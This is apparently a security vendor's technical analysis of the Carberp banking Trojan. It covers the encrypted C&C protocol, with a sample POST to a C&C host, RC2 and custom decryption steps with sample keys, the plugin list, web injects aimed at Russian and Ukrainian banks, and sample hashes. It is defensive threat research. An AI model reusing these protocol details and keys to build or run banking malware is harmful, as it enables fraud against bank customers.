There is recent news referring to a neutralization of a group of hackers by](http://www.kommersant.ua/doc/2160535)\njoint cooperation between the Security Service of Ukraine with the Federal Security Service\nof the Russian Federation (FSB) on the web. These hackers are responsible for the\ninfamous Trojan called Carberp.\n\nDue to this recent information, we are allowed to say that Carberp was as a mainstream\nTrojan that monitored the environment of infected computers and exploited remote banking\nsystems. It was a robust modular malware that improved its capabilities by drive-bydownloaded dynamic libraries – plugins. It was not only successfully grabbing money from\nvictim's bank accounts but also the attention of security experts both in an industrial and an\n[academic sphere (an example of a paper). Therefore there are plenty of references on the](http://staff.science.uva.nl/~delaat/rp/2012-2013/p42/report.pdf)\nweb considering the methods of a system invasion, protection by polymorphic outer layers\nand a persistence of the Trojan. We will try to fill in some gaps in the picture.\n\nCarberp started its progress approximately in autumn 2010. Later in spring 2011 it was split\ninto two main branches regarding the form of HTTP requests. The first one used the RC4\ncipher to encrypt data exchanged with C&C and it posted requests in the form:\n\nhttp://<top level domain>/e/<8-11 random alphanumeric characters>\n\n[This one faded away along with the arrest of cybercriminals in March 2012. The second one](http://news.techworld.com/security/3345695/russian-police-arrest-notorious-carberp-trojan-gang)\nwas based on RC2 cipher and it generated hits with avast! shields in the wild during the last\nweeks. Let's see how it talked with C&C.\n\n**Communication protocol**\n\nA typical HTTP post looked like\n\n\n-----\n\nPOST /kmqkcicalxrntrngwdxjyxztxcqkoyjnbdoafqirgnwwvpcjqglucovna.phtm HTTP/1.1\n\nAccept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0;\n.NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR\n3.5.30729)\n\nHost: caaarrp2.ru\n\nConnection: close\n\nContent-Type: application/x-www-form-urlencoded\n\nContent-Length: 60\n\nwith a content of the form like this:\n\nkfq=u%2FFPG1eImmXBEb3mG5VomEqE9ivVw2uh550qE1K2LoqWfJkbTeN%3D\n\nwhere ‘kfq’ is a randomly generated string which is concatenated with the equality sign and\nan encoded message. Unsafe characters in the encoded message are escaped with the\npercent sign. Let's write this particular example after decoding:\n\nkfq=u/FPG1eImmXBEb3mG5VomEqE9ivVw2uh550qE1K2LoqWfJkbTeN=\n\nand let's extract the first 4 symbols after the first equality symbol concatenated with the last 4\n[symbols (ignoring the tailing equality symbol ) as a string. It is used as a cryptographic salt](http://en.wikipedia.org/wiki/Salt_(cryptography))\nfor RC2 decryption and denote it szSalt, i.e. szSalt = ‘u/FPbTeN’. Then the proper encrypted\nmessage equals (denote it szEncMsg):\n\nG1eImmXBEb3mG5VomEqE9ivVw2uh550qE1K2LoqWfJ\n\nAfter the decryption on the server-side it would be read like\n‘botuid=wtfuck0780E8ABE9244C0B4’ where ‘wtfuck’ is a constant encrypted in Trojan’s body\nand ‘780E8ABE9244C0B4’ is a particular hash of victim’s environment. Every sample of\nCarberp contained another constant - a key, denote it szKey, e.g. szKey =\n‘mt19YrKTaSH3kCVA’.\n\nDecryption of the content is performed in the following steps:\n\nStep 1) Extraction of the proper encrypted message and the variable szSalt. Transformation\nof ‘+’ to ‘>’ and ‘/’ to ‘?’.\n\nStep 2) Decoding of szEncMsg to a buffer au8EncMsg_Debase64\n\nStep 3) Decrypting of the buffer au8EncMsg_Debase64 to a buffer\n_au8EncMsg_Debase64_DeRC2 using RC2 with the salt szSalt and the key szKey_\n\nIf the downloaded content is an encrypted executable or a configuration file then there is\nanother step:\n\n\n-----\n\nStep 4) Decrypting the buffer au8EncMsg_Debase64_DeRC2 using a custom algorithm\n_decryptBJB(..) that has already appeared in early stages of Carberp. A magic string \"BJB\" is_\nin the header and it is followed by a key length, a key string and a main ciphered data.\n\nOne of the early requests going to C&C is the wish for available plugins. After a successful\nconnection a list of plugins is saved in \"%AppData\\<hash sequence>\\wndsksi.inf\" in an\nencrypted form. Ignoring the first 20 bytes and using the mentioned decryptBJB algorithm\nwith the key \"GDlet64E\" one could get something similar to:\n\nammy.plug|Y05jP1GNybVxZ3Wv6sMQCwzmJ9rhH2Rg.tiff\nconfig.bin|KVZswznW95xFch3X.tiff\nddos.plug|ZqRMXA6Cxsg1m3KbdfyF2ncYPWV78TpN.bmp\nifobs.plug|8X2ZWnDfSsrpYtK1hdazxcq.bmp\npassw.plug|53DS2x0qgvmGzwtpyrahPQW9J8nNA.tiff\nrdp.plug|aDb6TYnKkc3Q7N.tiff\nrtlext.plug|jhJrdMWzK2XqpkYV91a6tQv7Z.psd\nsb.plug|8DhsH4PmpSFWrV7QwA5dtbv0KJN.tiff\nvnc.plug|JD6HPMCQjN8kgFYcR57pdtn1y2X0rm.psd\n\nThis list shows only a subset of plugins available for the bot. The following diagram estimates\nthe evolution of available plugins and the time when they appeared for the first time:\n\n\n-----\n\nCarberp Evolution of Plugins\n\n\n**Detailed analysis of plugins**\n\nPlugins from early stages of development are well known (miniav.plug, stopav.plug,\n_passw.plug) and the yellow ones seemed to be obsolete in recent versions of the bot. File_\n_ddos.plug exports the only function called ‘StartHTTP’ and contains a list of various HTTP_\nreferrers and domain names. The name of plugin indicates it's potential in a distributed\ndenial-of-service attack.\n\nThe orange group contains cyberplat.plug, sb.plug (evolved from early sbtest.plug version)\nand ifobs.plug that try to exploit Cyberplat, iFOBS and Sberbank payment processing\nsystems. Last month a download of a java archive called AgentX.jar together with an\nencrypted data file rt.ini ((two steps of decryption one of which is RC4 with the key\n\"123%esr2#221@#\" ) was implemented in the Carberp module. They are dropped into the\napplication directory of an e-banking system called IBank. The plain ini file could look like\n(observe that C&C servers of the bot):\n\n\n-----\n\nThe archive is a successor of previously used archives patching a Java code on the fly called\n_Agent.jar, AgentPassive.jar and AgentKP.jar. They all had a potential to fraudulently interact_\nwith a victim's payment processing. A text document uid.txt containing id of the running\ninstance of the bot was created and declared a sign of infection.\n\nThe light blue group represents utilities enhancing remote spying activities of the Trojan. File\n_vnc.plug is an executable that enables remote access to an infected computer via remote_\nframebuffer protocol (RFB). Additionally, it contains an embedded library inj_x86.dll\n(inj_x64.dll respectively) which provides a user mode rootkit functionality that masks\nprocesses started remotely (on \"secret_desktop\") on victim's desktop:\n\n\n-----\n\nThe green group is all about the plugin bot.plug which has most of the functionality of the\nmain Carberp module in the form of a dynamically linked library exporting three functions:\n_SetBotParameter, Start and SFFD (the latter injects its own code into explorer as the main_\n\n\n-----\n\nmodule does). It is produced by a generator called Bot builder:\n\nAfter a request of its download it is stored in an encrypted form in %AppData% directory for\nlater use. It could be remotely reactivated by a command installfakedll from a C&C server\nwhich leads to a drop of fake.dll into to the Internet Explorer program directory under various\nconfusing names (e.g. sqmapi.dll, browsui.dll). A function of this library is the decryption of\nstored bot.plug followed by calls of bot's exports Start and SFFD.\n\nOne of the files additionally requested is called config.bin. It is a set of JavaScript web injects\nperforming an attack to various internet banking systems in Russia and Ukraine. Injects are\ntriggered by particular masks in a web browser (example of a bank targeted is in the\nbracket):\n\n'banking.pivdenny.com' (Pivdennyi)\n'ibank.svyaznoybank.ru' (Svyaznoybank )\n'online.rsb.ru' (Russian Standard Bank)\n'bsi.dll?T=RT_1Loader.Load' (OJSC Nordea Bank)\n'ifobsClient/ifobstoday' (iFOBS Online Banking System, OTP Bank Ukraine)\nlibertyreserve (LibertyReserve)\nprivatbank (PrivateBank Ukraine)\n\nTo demonstrate a concept of injects on the mask \"google.com\" just observe the process of its\ncreation in the following steps: Chosing data before and data after a desired replacement of\nHTML code and filling the space with own code, then displaying how a source code appears\nin the configuration file and finally how it changes a content of a web page:\n\n\n-----\n\n-----\n\n-----\n\n**Carberp on Android**\n\nAt the end of 2012, three malicious Android applications were mentioned in connection with\n[Carberp (nicknamed Caberp-in-the-Mobile by security researchers) that tried to extend it’s](http://www.infosecurity-magazine.com/view/29874/after-zitmo-comes-citmo-carberp-in-the-mobile/)\nfraudulent activities to mobile devices (a triple represents application name, it's MD5 hash\nand a detection by avast! engine):\n\nSberSafe f27d43dfeedffac2ec7e4a069b3c9516 Android:Spitmo-E [Trj]\n\nAlfaSafe 07d2ee88083f41482a859cd222ec7b76 Android:SpyCitmo-D [Trj]\n\nVkSafe 117d41e18cb3813e48db8289a40e5350 Android:SpyCitmo-C [Trj]\n\nThese apps posted HTTP requests in the form:\n\nhttp://ber<REMOVED>.com/m/fo125kepro;http://ber<REMOVED>.com/m/as225kerto ;\n\nwith the domain that was also used as C&C by the branch of Carberp using RC4 encryption.\nThe conclusion is that these apps are probably not connected with the bot we have\nanalyzed.\n\n**Sources**\n\nFinally MD5 of some selected samples with the detections of avast! engine:\n\n\n-----\n\nCarberp Bot (version\n1.8)\n\n\n422ec27f405ea8415a6dd606f53ec5ca Win32:Carberp-ANO\n\n[Trj]\n\n\nsb.plug 3150522d039ea64715951d2461c04b9f Win32:Carberp-AI [Trj]\n\nrdp.plug 5f93b2f8d8c0f6f00f3cc99adbe7efc0 Win32:SpyeyePlugin-E\n\n[Trj]\n\nddos.plug e20146551b34409d71dde02a8e3d5c15 Win32:CarberpPlugin-L\n\n[Trj]\n\nvnc.plug 5683fcb77c6f6447aba75b44338cb461 Win32:CarberpPluginK [Trj]\n\nifobs.plug c96ff5f3ec55220e99b9d7c8a3a98e8f Win32:CarberpPluginM [Trj]\n\nbot.plug f29e19cbe20dd7e0eba5d1ff09abdbbb Win32:CarberpPluginP [Trj]\n\nfake.dll 6b2fcfa7cb57a44d28530eaf28ac253e Win32:CarberpPluginN [Trj]\n\nammy.plug 3b91280aa14a1dc0870f53f76a48c3f8 Win32:AmmyyRAdminA [PUP]\n\niphlpapi.dll 0993ac70dd8ab896ae349f45cc82d63d Win32:CarberpPluginQ [Trj]\n\nActiveX.jar 46f348d9a990004d8e2c5694f5544f56 Java:Carberp-A [Trj]\n\npassw.plug 38956767859e03e126f1d79c0f0e3ea0 Win32:CarberpPluginD [Trj]\n\n**Acknowledgment**\n\nSincere gratitude goes to my colleague Jaromír Hořejší for cooperation on this analysis.\n\n\n-----",
